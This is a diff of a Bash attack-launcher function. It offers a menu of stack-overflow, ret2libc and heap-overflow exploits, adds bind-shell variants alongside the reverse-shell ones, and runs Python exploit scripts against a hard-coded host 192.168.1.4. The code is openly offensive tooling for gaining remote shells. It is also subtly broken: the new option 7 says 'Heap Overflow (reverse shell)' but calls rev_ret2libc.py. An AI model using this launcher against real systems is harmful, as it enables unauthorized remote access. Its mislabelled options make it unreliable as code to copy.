@@ -7,10 +7,11 @@ Attack()
         	echo "	Stack overflow --> 1"
         	echo "	Ret2libc --> 2"
         	echo "	Heap overflow --> 3"
-		echo "	Stack overflow (reverse shell) --> 4"
-		echo "	Ret2libc (reverse shell) --> 5"
-		echo "	Heap Overflow (reverse shell) --> 6"
-		echo "	Select new server --> 7"
+		echo "	Stack overflow (bind shell) --> 4"
+		echo "	Heap Overflow (bind shell) --> 5"
+		echo "	Stack overflow (reverse shell) --> 6"
+		echo "	Heap Overflow (reverse shell) --> 7"
+		echo "	Select new server --> 8"
 
        		read input
         	case $input in
@@ -24,28 +25,31 @@ Attack()
                        		$1/ho.py "192.168.1.4" 5555
                       		;;
 			4)
-				$1/so_rev.py "192.168.1.4" 5555
+				$1/so_bind.py "192.168.1.4" 5555
 				;;
 			5)
+				$1/ho_bind.py "192.168.1.4" 5555
+				;;
+			6)
+				$1/so_rev.py "192.168.1.4" 5555
+				;;
+			7)
 				$1/rev_ret2libc.py "192.168.1.4" 5555
 				;;
-			6)	
-				$1/ho_rev.py "192.168.1.4" 5555
-				;;
-
-			7)
+			8)
 				return
 				;;
                		*) 
-		                echo "Please choose a particular attack..."
-                		echo "  Stack overflow --> 1"
-		                echo "  Ret2libc --> 2"
-        		        echo "  Heap overflow --> 3"
-                		echo "  Stack overflow (reverse shell) --> 4"
-		                echo "  Ret2libc (reverse shell) --> 5"
-        	        	echo "  Heap Overflow (reverse shell) --> 6"
-                		echo "  Select new server --> 7"
-                       		;;
+        			echo "Please choose a particular attack..."
+       			 	echo "	Stack overflow --> 1"
+	        		echo "	Ret2libc --> 2"
+        			echo "	Heap overflow --> 3"
+				echo "	Stack overflow (bind shell) --> 4"
+				echo "	Heap Overflow (bind shell) --> 5"
+				echo "	Stack overflow (reverse shell) --> 6"
+				echo "	Heap Overflow (reverse shell) --> 7"
+				echo "	Select new server --> 8"
+				;;
        		esac
 	done
 }
